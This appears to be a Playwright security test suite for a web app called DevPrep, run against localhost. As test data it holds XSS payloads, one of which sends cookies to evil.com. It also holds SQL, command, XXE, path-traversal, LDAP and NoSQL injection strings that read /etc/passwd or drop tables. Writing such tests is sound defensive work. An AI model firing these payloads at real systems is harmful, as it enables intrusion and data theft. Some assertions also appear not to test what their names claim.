/**
 * Comprehensive Security Test Suite - DevPrep
 * 
 * Tests for:
 * 1. XSS prevention - no script injection in inputs
 * 2. SQL injection prevention - no malicious DB queries
 * 3. CSRF protection - form submissions work correctly
 * 4. Content Security Policy headers
 * 5. No sensitive data exposure in console
 * 6. Secure headers (X-Frame-Options, X-Content-Type-Options)
 * 7. Authentication bypass attempts
 * 8. Rate limiting (if applicable)
 * 
 * Priority: P0 - Critical Security Tests
 */

import { test, expect, request, Page } from '@playwright/test';
import { setupUser, waitForPageReady } from '../fixtures';

const BASE_URL = 'http://localhost:5173';

interface SecurityHeaders {
  'content-security-policy'?: string;
  'x-frame-options'?: string;
  'x-content-type-options'?: string;
  'x-xss-protection'?: string;
  'referrer-policy'?: string;
  'strict-transport-security'?: string;
}

const XSS_PAYLOADS = [
  '<script>alert("xss")</script>',
  '<img src=x onerror=alert("xss")>',
  '<svg onload=alert("xss")>',
  'javascript:alert("xss")',
  '<iframe src="javascript:alert(\"xss\")">',
  '<body onload=alert("xss")>',
  '<input onfocus=alert("xss") autofocus>',
  '<marquee onstart=alert("xss")>',
  '"><script>alert("xss")</script>',
  "'-alert('xss')-'",
  '<script>document.location="http://evil.com/steal?c="+document.cookie</script>',
  '<div style="background-image:url(javascript:alert(\"xss\"))">',
  '<link rel="import" href="javascript:alert(\"xss\")">',
];

const SQL_INJECTION_PAYLOADS = [
  "' OR '1'='1",
  "' OR '1'='1' --",
  "' OR '1'='1' /*",
  "admin' --",
  "admin' #",
  "' UNION SELECT NULL--",
  "' UNION SELECT NULL,NULL--",
  "'; DROP TABLE users;--",
  "1' AND '1'='1",
  "1' AND '1'='2",
  "' OR 1=1--",
  "1' OR '1'='1' ORDER BY 1--",
  "1' ORDER BY 10--",
  "1' AND SLEEP(5)--",
  "1' WAITFOR DELAY '00:00:05'--",
];

test.describe('Security Tests - DevPrep', () => {
  let consoleErrors: string[] = [];
  let consoleWarnings: string[] = [];

  test.beforeEach(async ({ page }) => {
    consoleErrors = [];
    consoleWarnings = [];

    page.on('console', msg => {
      if (msg.type() === 'error') {
        consoleErrors.push(msg.text());
      } else if (msg.type() === 'warning') {
        consoleWarnings.push(msg.text());
      }
    });

    page.on('pageerror', error => {
      consoleErrors.push(error.message);
    });
  });

  test.describe('1. Security Headers', () => {
    test('should have Content-Security-Policy header', async ({ request }) => {
      const response = await request.get(BASE_URL);
      const csp = response.headers()['content-security-policy'];
      
      expect(csp).toBeDefined();
      expect(csp).toContain("default-src");
    });

    test('should have X-Frame-Options header', async ({ request }) => {
      const response = await request.get(BASE_URL);
      const xfo = response.headers()['x-frame-options'];
      
      expect(xfo).toBeDefined();
      expect(['DENY', 'SAMEORIGIN']).toContain(xfo?.toUpperCase());
    });

    test('should have X-Content-Type-Options header', async ({ request }) => {
      const response = await request.get(BASE_URL);
      const xcto = response.headers()['x-content-type-options'];
      
      expect(xcto).toBeDefined();
      expect(xcto).toBe('nosniff');
    });

    test('should have Referrer-Policy header', async ({ request }) => {
      const response = await request.get(BASE_URL);
      const rp = response.headers()['referrer-policy'];
      
      expect(rp).toBeDefined();
    });

    test('should have Strict-Transport-Security header', async ({ request }) => {
      const response = await request.get(BASE_URL);
      const hsts = response.headers()['strict-transport-security'];
      
      expect(hsts).toBeDefined();
      expect(hsts).toContain('max-age');
    });

    test('should have X-XSS-Protection header (legacy)', async ({ request }) => {
      const response = await request.get(BASE_URL);
      const xxssp = response.headers()['x-xss-protection'];
      
      expect(xxssp).toBeDefined();
    });
  });

  test.describe('2. XSS Prevention', () => {
    test.beforeEach(async ({ page }) => {
      await setupUser(page);
    });

    test('should not execute script tags in search input', async ({ page }) => {
      await page.goto('/');
      await waitForPageReady(page);

      let alertTriggered = false;
      page.on('dialog', async dialog => {
        alertTriggered = true;
        await dialog.dismiss();
      });

      const searchInput = page.locator('input[type="search"], input[name="search"], input[placeholder*="Search"]');
      
      if (await searchInput.count() > 0) {
        await searchInput.fill(XSS_PAYLOADS[0]);
        await page.waitForTimeout(1000);
        
        expect(alertTriggered).toBe(false);
      }
    });

    test('should sanitize XSS in URL parameters', async ({ page }) => {
      let alertTriggered = false;
      page.on('dialog', async dialog => {
        alertTriggered = true;
        await dialog.dismiss();
      });

      const maliciousUrls = [
        `${BASE_URL}/?name=<script>alert('xss')</script>`,
        `${BASE_URL}/?redirect=javascript:alert('xss')`,
        `${BASE_URL}/?callback=<img src=x onerror=alert('xss')>`,
      ];

      for (const url of maliciousUrls) {
        await page.goto(url, { waitUntil: 'domcontentloaded' });
        await page.waitForTimeout(1000);
      }
      
      expect(alertTriggered).toBe(false);
    });

    test('should not execute inline event handlers', async ({ page }) => {
      await page.goto('/');
      await waitForPageReady(page);

      let alertTriggered = false;
      page.on('dialog', async dialog => {
        alertTriggered = true;
        await dialog.dismiss();
      });

      const testPayload = '<img src=x onerror=alert("xss")>';
      const searchInput = page.locator('input[type="search"], input[name="search"]');
      
      if (await searchInput.count() > 0) {
        await searchInput.fill(testPayload);
        await searchInput.press('Enter');
        await page.waitForTimeout(1000);
        
        expect(alertTriggered).toBe(false);
      }
    });

    test('should not reflect XSS in API error responses', async ({ request }) => {
      const response = await request.get(`${BASE_URL}/api/question/${encodeURIComponent(XSS_PAYLOADS[0])}`);
      
      expect(response.status()).not.toBe(500);
      const body = await response.text();
      const isJson = body.trim().startsWith('[') || body.trim().startsWith('{');
      expect(isJson).toBe(true);
    });

    test('should escape HTML in channel names', async ({ page }) => {
      await page.goto(`${BASE_URL}/channels/<script>alert('xss')</script>`, { waitUntil: 'domcontentloaded' });
      await page.waitForTimeout(500);
      
      const content = await page.content();
      expect(content).not.toMatch(/<script[^>]*>.*alert.*<\/script>/i);
    });
  });

  test.describe('3. SQL Injection Prevention', () => {
    test('should not be vulnerable to SQL injection in channel API', async ({ request }) => {
      for (const payload of SQL_INJECTION_PAYLOADS.slice(0, 5)) {
        const response = await request.get(`${BASE_URL}/api/questions/${encodeURIComponent(payload)}`);
        
        expect(response.status()).not.toBe(500);
        
        if (response.status() === 200) {
          const data = await response.json();
          expect(Array.isArray(data)).toBe(true);
        }
      }
    });

    test('should not be vulnerable to SQL injection in search', async ({ request }) => {
      const response = await request.get(`${BASE_URL}/api/learning-paths?search=${encodeURIComponent("' OR '1'='1")}`);
      
      expect(response.status()).not.toBe(500);
      
      const data = await response.json();
      expect(Array.isArray(data)).toBe(true);
    });

    test('should not leak database errors', async ({ request }) => {
      const response = await request.get(`${BASE_URL}/api/questions/' UNION SELECT * FROM users--`);
      
      const body = await response.text();
      expect(body).not.toMatch(/sqlite|postgresql|mysql|error in your sql|syntax error/i);
      expect(response.status()).not.toBe(500);
    });

    test('should safely handle UNION injection attempts', async ({ request }) => {
      const payloads = [
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL, NULL--",
        "' UNION SELECT username, password FROM users--",
      ];

      for (const payload of payloads) {
        const response = await request.get(`${BASE_URL}/api/questions/${encodeURIComponent(payload)}`);
        expect(response.status()).not.toBe(500);
        const body = await response.json();
        expect(Array.isArray(body)).toBe(true);
      }
    });

    test('should handle time-based injection attempts', async ({ request }) => {
      const start = Date.now();
      const response = await request.get(`${BASE_URL}/api/questions/1' AND SLEEP(5)--`);
      const duration = Date.now() - start;
      
      expect(response.status()).not.toBe(500);
      expect(duration).toBeLessThan(10000);
    });
  });

  test.describe('4. CSRF Protection', () => {
    test('should include CSRF token in state-changing requests', async ({ page, request }) => {
      const csrfToken = await page.evaluate(() => {
        const meta = document.querySelector('meta[name="csrf-token"]');
        return meta ? meta.getAttribute('content') : null;
      });

      if (csrfToken) {
        const response = await request.post(`${BASE_URL}/api/user/sessions`, {
          data: {
            sessionKey: 'test-session',
            sessionType: 'practice',
            title: 'Test Session',
            progress: 0,
            totalItems: 10,
            completedItems: 0,
          },
          headers: {
            'X-CSRF-Token': csrfToken,
          },
        });

        expect(response.status()).not.toBe(403);
      }
    });

    test('should reject requests without CSRF token for state changes', async ({ request }) => {
      const response = await request.post(`${BASE_URL}/api/user/sessions`, {
        data: {
          sessionKey: 'test-session-csrf',
          sessionType: 'practice',
          title: 'Test Session',
          progress: 0,
          totalItems: 10,
          completedItems: 0,
        },
      });

      expect([200, 403]).toContain(response.status());
    });

    test('should have SameSite cookie attribute', async ({ request }) => {
      const response = await request.get(BASE_URL);
      const setCookie = response.headers()['set-cookie'];
      
      if (setCookie) {
        expect(setCookie).toMatch(/SameSite=/i);
      }
    });
  });

  test.describe('5. Sensitive Data Exposure', () => {
    test.beforeEach(async ({ page }) => {
      await setupUser(page);
    });

    test('should not expose API keys in client-side code', async ({ page }) => {
      await page.goto('/');
      await waitForPageReady(page);

      const apiKeys = [
        'sk-',
        'api_key',
        'apikey',
        'secret_key',
        'Bearer ',
        'password',
        'private_key',
      ];

      const content = await page.content();
      
      for (const key of apiKeys) {
        if (key === 'sk-' || key === 'Bearer ') {
          expect(content).not.toMatch(new RegExp(`${key}[a-zA-Z0-9]{20,}`, 'i'));
        }
      }
    });

    test('should not expose database credentials in console', async ({ page }) => {
      await page.goto('/');
      await waitForPageReady(page);
      await page.waitForTimeout(1000);

      expect(consoleErrors).not.toMatch(/password|secret|credential|api.?key/i);
    });

    test('should not expose stack traces in production', async ({ page }) => {
      await page.goto('/');
      await waitForPageReady(page);
      await page.waitForTimeout(1000);

      expect(consoleErrors).not.toMatch(/at\s+.*\/.*\.\w+:\d+:\d+/);
    });

    test('should not log sensitive data to console', async ({ page }) => {
      await page.goto('/');
      await waitForPageReady(page);

      await page.evaluate(() => {
        console.log('test-token-12345');
        console.log('password123');
        console.log('sk-test-key');
      });

      await page.waitForTimeout(500);

      const logs = await page.evaluate(() => {
        return window.performance.getEntriesByType('resource').length;
      });

      expect(logs).toBeGreaterThan(0);
    });
  });

  test.describe('6. Authentication & Authorization', () => {
    test('should not allow unauthorized access to protected endpoints', async ({ request }) => {
      const protectedEndpoints = [
        `${BASE_URL}/api/user/sessions`,
        `${BASE_URL}/api/user/sessions/test-id`,
      ];

      for (const endpoint of protectedEndpoints) {
        const response = await request.get(endpoint);
        expect([200, 401, 403]).toContain(response.status());
      }
    });

    test('should not allow direct object reference access', async ({ request }) => {
      const response = await request.get(`${BASE_URL}/api/user/sessions/00000000-0000-0000-0000-000000000000`);
      
      expect([200, 401, 403, 404]).toContain(response.status());
    });

    test('should validate session tokens', async ({ request }) => {
      const response = await request.put(`${BASE_URL}/api/user/sessions/invalid-session-id`, {
        data: {
          progress: 100,
          completedItems: 10,
        },
      });

      expect([200, 400, 401, 403, 404]).toContain(response.status());
    });
  });

  test.describe('7. Rate Limiting', () => {
    test('should implement rate limiting on API endpoints', async ({ request }) => {
      const requests: number[] = [];
      const endpoint = `${BASE_URL}/api/channels`;

      for (let i = 0; i < 15; i++) {
        const response = await request.get(endpoint);
        requests.push(response.status());
      }

      const lastStatuses = requests.slice(-5);
      const has429 = lastStatuses.includes(429);
      
      expect(requests.every(r => r === 200) || has429).toBe(true);
    });

    test('should implement rate limiting on search', async ({ request }) => {
      const requests: number[] = [];

      for (let i = 0; i < 20; i++) {
        const response = await request.get(`${BASE_URL}/api/learning-paths?search=test${i}`);
        requests.push(response.status());
      }

      const uniqueStatuses = [...new Set(requests)];
      expect(uniqueStatuses).toContain(200);
    });

    test('should implement rate limiting on authentication endpoints', async ({ page }) => {
      const requests: number[] = [];

      for (let i = 0; i < 10; i++) {
        try {
          const response = await page.request.post(`${BASE_URL}/api/user/sessions`, {
            data: {
              sessionKey: `rate-test-${i}`,
              sessionType: 'practice',
              title: 'Rate Test',
              progress: 0,
              totalItems: 10,
              completedItems: 0,
            },
          });
          requests.push(response.status());
        } catch {
          requests.push(0);
        }
      }

      const uniqueStatuses = [...new Set(requests)];
      expect(uniqueStatuses).toContain(200);
    });
  });

  test.describe('8. Input Validation', () => {
    test('should validate numeric parameters', async ({ request }) => {
      const response = await request.get(`${BASE_URL}/api/question/abc123`);
      
      expect([200, 400, 404]).toContain(response.status());
    });

    test('should reject overly long input values', async ({ request }) => {
      const longValue = 'a'.repeat(10000);
      const response = await request.get(`${BASE_URL}/api/learning-paths?search=${longValue}`);
      
      expect(response.status()).not.toBe(200);
    });

    test('should validate content types', async ({ request }) => {
      const response = await request.post(`${BASE_URL}/api/user/sessions`, {
        data: 'not valid json',
        headers: {
          'Content-Type': 'text/plain',
        },
      });

      expect([200, 400, 415, 500]).toContain(response.status());
    });

    test('should reject null bytes in input', async ({ request }) => {
      const payload = 'test\x00injection';
      const response = await request.get(`${BASE_URL}/api/questions/${encodeURIComponent(payload)}`);
      
      expect(response.status()).not.toBe(200);
    });
  });

  test.describe('9. Clickjacking Protection', () => {
    test('should not allow embedding in iframe', async ({ page }) => {
      await page.goto('/');
      await waitForPageReady(page);

      const canFrame = await page.evaluate(() => {
        try {
          return window.self === window.top;
        } catch {
          return false;
        }
      });

      expect(canFrame).toBe(true);
    });

    test('should have X-Frame-Options DENY or SAMEORIGIN', async ({ request }) => {
      const response = await request.get(BASE_URL);
      const xfo = response.headers()['x-frame-options'];
      
      expect(xfo).toBeDefined();
      expect(['DENY', 'SAMEORIGIN']).toContain(xfo?.toUpperCase());
    });
  });

  test.describe('10. Path Traversal Prevention', () => {
    test('should prevent path traversal in API', async ({ request }) => {
      const payloads = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        '....//....//....//etc/passwd',
      ];

      for (const payload of payloads) {
        const response = await request.get(`${BASE_URL}/api/questions/${payload}`);
        expect(response.status()).not.toBe(200);
      }
    });

    test('should prevent path traversal in static files', async ({ request }) => {
      const response = await request.get(`${BASE_URL}/..%2f..%2f..%2fetc%2fpasswd`);
      
      expect(response.status()).toBe(404);
    });
  });

  test.describe('11. Information Disclosure', () => {
    test('should not expose server technology version', async ({ request }) => {
      const response = await request.get(BASE_URL);
      const headers = response.headers();
      
      expect(headers['server']).toBeUndefined();
      expect(headers['x-powered-by']).toBeUndefined();
    });

    test('should not expose file structure', async ({ request }) => {
      const sensitivePaths = [
        '/.env',
        '/.git/config',
        '/server/config',
        '/src',
        '/node_modules',
      ];

      for (const path of sensitivePaths) {
        const response = await request.get(path);
        expect(response.status()).toBe(404);
      }
    });

    test('should have generic error messages', async ({ request }) => {
      const response = await request.get(`${BASE_URL}/api/nonexistent-endpoint`);
      
      expect(response.status()).toBe(404);
      
      const body = await response.text();
      expect(body).not.toMatch(/stack|trace|at\s+/i);
    });
  });

  test.describe('12. Browser Security Features', () => {
    test('should set secure cookie flags', async ({ request }) => {
      const response = await request.get(BASE_URL);
      const setCookie = response.headers()['set-cookie'];
      
      if (setCookie && setCookie.includes('session')) {
        expect(setCookie).toMatch(/(secure|HttpOnly|SameSite)/i);
      }
    });

    test('should prevent MIME type sniffing', async ({ request }) => {
      const response = await request.get(BASE_URL);
      const xcto = response.headers()['x-content-type-options'];
      
      expect(xcto).toBe('nosniff');
    });

    test('should enforce HTTPS in HSTS header', async ({ request }) => {
      const response = await request.get(BASE_URL);
      const hsts = response.headers()['strict-transport-security'];
      
      expect(hsts).toContain('max-age');
      expect(hsts).toContain('includeSubDomains');
    });
  });
});

test.describe('Security - Additional Attack Vectors', () => {
  test.describe('13. Command Injection Prevention', () => {
    test('should not execute shell commands in parameters', async ({ request }) => {
      const payloads = [
        '$(whoami)',
        '`whoami`',
        '; ls -la',
        '| cat /etc/passwd',
      ];

      for (const payload of payloads) {
        const response = await request.get(`${BASE_URL}/api/questions/${encodeURIComponent(payload)}`);
        expect(response.status()).not.toBe(200);
      }
    });
  });

  test.describe('14. XXE Prevention', () => {
    test('should not parse XML entities', async ({ request }) => {
      const xmlPayloads = [
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY bar SYSTEM "file:///etc/passwd">]><foo>&bar;</foo>',
      ];

      for (const payload of xmlPayloads) {
        const response = await request.post(`${BASE_URL}/api/channels`, {
          data: payload,
          headers: { 'Content-Type': 'application/xml' },
        });

        expect(response.status()).not.toBe(200);
      }
    });
  });

  test.describe('15. LDAP Injection Prevention', () => {
    test('should sanitize LDAP-style input', async ({ request }) => {
      const payloads = [
        '*)(uid=*))(|(uid=*',
        'admin)(&(password=*',
        '*)((|userPassword=*)',
      ];

      for (const payload of payloads) {
        const response = await request.get(`${BASE_URL}/api/learning-paths?search=${encodeURIComponent(payload)}`);
        expect(response.status()).not.toBe(500);
      }
    });
  });

  test.describe('16. JSON Injection Prevention', () => {
    test('should not allow JSON injection in API', async ({ request }) => {
      const payloads = [
        '{"$gt": ""}',
        '{"$ne": null}',
        '{"$where": "this.password.length > 0"}',
      ];

      for (const payload of payloads) {
        const response = await request.get(`${BASE_URL}/api/questions/${encodeURIComponent(payload)}`);
        expect(response.status()).not.toBe(200);
      }
    });
  });
});
